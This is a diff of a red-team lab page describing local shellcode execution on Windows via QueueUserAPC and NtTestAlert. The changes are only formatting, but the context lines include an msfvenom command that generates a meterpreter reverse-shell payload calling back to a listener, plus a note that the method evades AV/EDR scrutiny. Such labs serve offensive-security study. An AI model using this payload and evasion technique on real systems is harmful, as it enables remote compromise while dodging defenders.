@@ -4,7 +4,7 @@ This is a quick lab that shows how to execute shellcode within a local process b
 
 The advantage of this technique is that it does not rely on `CreateThread` or `CreateRemoteThread` API calls which are more popular and hence usually more scrutinized by SOCs and AV/EDR vendors.
 
-Thanks to [Mumbai](https://twitter.com/win64_) for pointing me to `NtTestAlert`.
+Thanks to [Mumbai](https://twitter.com/win64\_) for pointing me to `NtTestAlert`.
 
 ## Execution
 
@@ -24,11 +24,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/annotation-2019-05-27-191650.png)
+![](<../../.gitbook/assets/Annotation 2019-05-27 191650.png>)
 
 Short code that performs `NtTestAlert` function address resolution, memory allocation, shellcode writing to memory, APC queuing and `NtTestAlert` call:
 
-![](../../.gitbook/assets/annotation-2019-05-27-192952.png)
+![](<../../.gitbook/assets/Annotation 2019-05-27 192952.png>)
 
 Now, set up a multi handler for catching the incoming meterpreter connection:
 
@@ -75,4 +75,3 @@ int main()
 {% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html" %}
 
 {% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc" %}
-
